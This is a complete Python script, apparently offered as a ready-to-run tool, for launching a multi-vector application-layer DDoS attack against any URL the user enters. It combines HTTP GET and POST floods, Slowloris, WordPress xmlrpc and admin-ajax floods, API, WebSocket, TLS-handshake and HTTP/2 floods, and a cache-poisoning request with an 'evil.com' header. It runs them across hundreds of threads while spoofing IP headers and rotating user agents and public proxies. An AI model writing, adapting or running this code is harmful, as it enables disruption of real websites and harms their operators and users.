#!/usr/bin/env python3
"""
DEEP-AI LAYER 7 DDoS MASTER v7.0
Complete Application Layer Attacks
"""

import os
import sys
import time
import random
import socket
import ssl
import threading
import requests
import urllib3
import json
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from colorama import Fore, Style, init
from fake_useragent import UserAgent

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class Layer7Attacker:
    def __init__(self, target_url):
        self.target = target_url
        self.domain = target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url
        self.ua = UserAgent()
        self.session = requests.Session()
        self.session.verify = False
        self.attack_counter = 0
        self.success_counter = 0
        self.proxies = self.load_proxies()
        
    def load_proxies(self):
        """Load proxy list for rotation"""
        proxies = []
        try:
            # Public proxy sources
            proxy_sources = [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
            ]
            
            for source in proxy_sources:
                try:
                    response = requests.get(source, timeout=10)
                    proxies.extend(response.text.strip().split('\n'))
                except:
                    continue
        except:
            pass
        
        return [p.strip() for p in proxies if p.strip()]
    
    # ==================== LAYER 7 ATTACK METHODS ====================
    
    def http_get_flood(self):
        """Standard HTTP GET Flood"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
        
        try:
            response = self.session.get(
                self.target,
                headers=headers,
                timeout=5,
                allow_redirects=True
            )
            self.attack_counter += 1
            if response.status_code < 500:
                self.success_counter += 1
            return True
        except:
            return False
    
    def http_post_flood(self):
        """HTTP POST Flood with random data"""
        headers = {
            'User-Agent': self.ua.random,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': self.target,
            'Referer': self.target,
            'X-Requested-With': 'XMLHttpRequest',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
        
        # Generate random POST data
        post_data = {
            'username': base64.b64encode(os.urandom(10)).decode(),
            'password': base64.b64encode(os.urandom(12)).decode(),
            'email': f'{os.urandom(6).hex()}@gmail.com',
            'csrf_token': hashlib.md5(os.urandom(16)).hexdigest(),
            'submit': '1',
            'action': 'login',
            'remember': '1'
        }
        
        try:
            response = self.session.post(
                self.target,
                data=post_data,
                headers=headers,
                timeout=5,
                allow_redirects=True
            )
            self.attack_counter += 1
            return True
        except:
            return False
    
    def slowloris_attack(self, sockets_count=200):
        """Slowloris Attack - Keep many connections open"""
        sockets = []
        
        # Create multiple sockets
        for i in range(sockets_count):
            try:
                if self.target.startswith('https'):
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = socket.create_connection((self.domain, 443), timeout=5)
                    sock = ctx.wrap_socket(sock, server_hostname=self.domain)
                else:
                    sock = socket.create_connection((self.domain, 80), timeout=5)
                
                # Send incomplete HTTP request
                request = f"GET /?{i} HTTP/1.1\r\n"
                request += f"Host: {self.domain}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Accept-Language: en-US,en;q=0.5\r\n"
                request += "Accept-Encoding: gzip, deflate\r\n"
                request += "Connection: keep-alive\r\n"
                
                sock.send(request.encode())
                sockets.append(sock)
            except:
                continue
        
        # Keep connections alive
        start_time = time.time()
        while time.time() - start_time < 300:  # 5 minutes
            for sock in sockets:
                try:
                    # Send keep-alive headers
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    pass
            time.sleep(random.randint(15, 30))
        
        # Close sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        self.attack_counter += len(sockets)
        return True
    
    def goldeneye_attack(self):
        """GoldenEye style attack - multiple request types"""
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
        url_paths = ['/', '/index.html', '/wp-admin', '/api/v1/users', '/login', '/register', '/search']
        
        headers = {
            'User-Agent': self.ua.random,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        try:
            method = random.choice(methods)
            path = random.choice(url_paths)
            url = f"{self.target.rstrip('/')}{path}"
            
            if method in ['POST', 'PUT', 'PATCH']:
                data = {'data': os.urandom(50).hex()}
                response = self.session.request(method, url, data=data, headers=headers, timeout=5)
            else:
                response = self.session.request(method, url, headers=headers, timeout=5)
            
            self.attack_counter += 1
            return True
        except:
            return False
    
    def wordpress_attack(self):
        """WordPress specific attack"""
        wp_paths = [
            '/wp-admin/admin-ajax.php',
            '/wp-login.php',
            '/xmlrpc.php',
            '/wp-cron.php',
            '/wp-admin/load-scripts.php',
            '/wp-admin/load-styles.php'
        ]
        
        headers = {
            'User-Agent': 'WordPress/6.0; ' + self.ua.random,
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        try:
            path = random.choice(wp_paths)
            url = f"{self.target.rstrip('/')}{path}"
            
            if 'xmlrpc.php' in path:
                # XML-RPC attack
                xml_data = """<?xml version="1.0"?>
                <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                <param><value>admin</value></param>
                <param><value>password123</value></param>
                </params>
                </methodCall>"""
                headers['Content-Type'] = 'text/xml'
                response = self.session.post(url, data=xml_data, headers=headers, timeout=5)
            
            elif 'admin-ajax.php' in path:
                # Admin AJAX attack
                post_data = {
                    'action': 'heartbeat',
                    '_nonce': hashlib.md5(os.urandom(10)).hexdigest(),
                    'data': {'interval': 15}
                }
                response = self.session.post(url, data=post_data, headers=headers, timeout=5)
            
            else:
                response = self.session.get(url, headers=headers, timeout=5)
            
            self.attack_counter += 1
            return True
        except:
            return False
    
    def api_endpoint_attack(self):
        """Attack API endpoints"""
        api_endpoints = [
            '/api/v1/users',
            '/api/auth/login',
            '/api/products',
            '/api/search',
            '/graphql',
            '/rest/V1/products',
            '/oauth/token'
        ]
        
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {os.urandom(20).hex()}'
        }
        
        try:
            endpoint = random.choice(api_endpoints)
            url = f"{self.target.rstrip('/')}{endpoint}"
            
            if random.choice([True, False]):
                # GET request
                response = self.session.get(url, headers=headers, timeout=5)
            else:
                # POST with JSON data
                json_data = {
                    'query': '{ users { id name email } }' if 'graphql' in endpoint else {'test': 'data'},
                    'variables': {'input': os.urandom(50).hex()}
                }
                response = self.session.post(url, json=json_data, headers=headers, timeout=5)
            
            self.attack_counter += 1
            return True
        except:
            return False
    
    def websocket_flood(self):
        """WebSocket connection flood"""
        try:
            # WebSocket handshake
            ws_headers = [
                'GET / HTTP/1.1',
                f'Host: {self.domain}',
                'Upgrade: websocket',
                'Connection: Upgrade',
                f'Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}',
                'Sec-WebSocket-Version: 13',
                'Sec-WebSocket-Extensions: permessage-deflate',
                '\r\n'
            ]
            
            if self.target.startswith('https'):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((self.domain, 443), timeout=5)
                sock = ctx.wrap_socket(sock, server_hostname=self.domain)
            else:
                sock = socket.create_connection((self.domain, 80), timeout=5)
            
            sock.send('\r\n'.join(ws_headers).encode())
            
            # Keep connection alive
            start_time = time.time()
            while time.time() - start_time < 60:
                try:
                    # Send ping frames
                    sock.send(b'\x89\x00')  # Ping frame
                    time.sleep(1)
                except:
                    break
            
            sock.close()
            self.attack_counter += 1
            return True
        except:
            return False
    
    def ssl_negotiation_flood(self):
        """SSL/TLS negotiation flood"""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            # Multiple SSL handshakes
            for _ in range(10):
                try:
                    sock = socket.create_connection((self.domain, 443), timeout=2)
                    ssl_sock = ctx.wrap_socket(sock, server_hostname=self.domain)
                    time.sleep(0.1)
                    ssl_sock.close()
                except:
                    continue
            
            self.attack_counter += 10
            return True
        except:
            return False
    
    def cache_poisoning_attack(self):
        """Cache poisoning attack"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'X-Forwarded-Host': 'evil.com',
            'X-Original-URL': '/malicious',
            'X-Rewrite-URL': '/admin',
            'Host': f'{random.randint(100000, 999999)}.{self.domain}'
        }
        
        try:
            response = self.session.get(
                self.target,
                headers=headers,
                timeout=5,
                allow_redirects=False
            )
            self.attack_counter += 1
            return True
        except:
            return False
    
    def http2_multiplexing_attack(self):
        """HTTP/2 multiplexing attack"""
        try:
            # Using HTTP/2 with many concurrent streams
            import httpx
            client = httpx.Client(http2=True)
            
            # Multiple concurrent requests
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = []
                for i in range(100):
                    futures.append(executor.submit(client.get, self.target))
                
                for future in as_completed(futures):
                    try:
                        future.result(timeout=5)
                        self.attack_counter += 1
                    except:
                        pass
            
            client.close()
            return True
        except:
            # Fallback to HTTP/1.1
            return self.http_get_flood()
    
    # ==================== ATTACK CONTROLLER ====================
    
    def start_multi_vector_attack(self, duration=3600, threads_per_method=500):
        """Start all Layer 7 attack methods simultaneously"""
        print(f"{Fore.CYAN}[*] Starting Multi-Vector Layer 7 DDoS Attack{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Target: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Duration: {duration} seconds{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Attack Methods: 11 different Layer 7 techniques{Style.RESET_ALL}")
        
        attack_methods = [
            self.http_get_flood,
            self.http_post_flood,
            self.goldeneye_attack,
            self.wordpress_attack,
            self.api_endpoint_attack,
            self.cache_poisoning_attack,
            self.http2_multiplexing_attack
        ]
        
        # Special attacks (run separately)
        special_attacks = [
            (self.slowloris_attack, 50),  # 50 sockets
            (self.websocket_flood, 1),
            (self.ssl_negotiation_flood, 1)
        ]
        
        end_time = time.time() + duration
        
        # Start regular attacks
        with ThreadPoolExecutor(max_workers=threads_per_method * len(attack_methods)) as executor:
            while time.time() < end_time:
                for method in attack_methods:
                    for _ in range(threads_per_method):
                        executor.submit(method)
                
                # Progress report
                elapsed = int(time.time() - (end_time - duration))
                print(f"{Fore.YELLOW}[+] Attacks: {self.attack_counter:,} | Success: {self.success_counter:,} | Time: {elapsed}s/{duration}s{Style.RESET_ALL}")
                time.sleep(1)
        
        # Start special attacks
        print(f"{Fore.CYAN}[*] Starting special Layer 7 attacks...{Style.RESET_ALL}")
        for method, count in special_attacks:
            for _ in range(count):
                method()
        
        print(f"{Fore.GREEN}[✓] Attack completed!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Total attacks sent: {self.attack_counter:,}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Successful requests: {self.success_counter:,}{Style.RESET_ALL}")

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    print(f"""
{Fore.RED}╔═══════════════════════════════════════════════════════╗
{Fore.RED}║     {Fore.WHITE}LAYER 7 DDoS MASTER v7.0 - DEEP AI{Fore.RED}              ║
{Fore.RED}║     {Fore.YELLOW}Advanced Application Layer Attacks{Fore.RED}              ║
{Fore.RED}╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """)
    
    if len(sys.argv) < 2:
        target = input(f"{Fore.CYAN}[?] Enter target URL: {Style.RESET_ALL}")
        if not target.startswith('http'):
            target = 'http://' + target
    else:
        target = sys.argv[1]
    
    try:
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 3600
        threads = int(sys.argv[3]) if len(sys.argv) > 3 else 500
    except:
        duration = 3600
        threads = 500
    
    attacker = Layer7Attacker(target)
    attacker.start_multi_vector_attack(duration, threads)
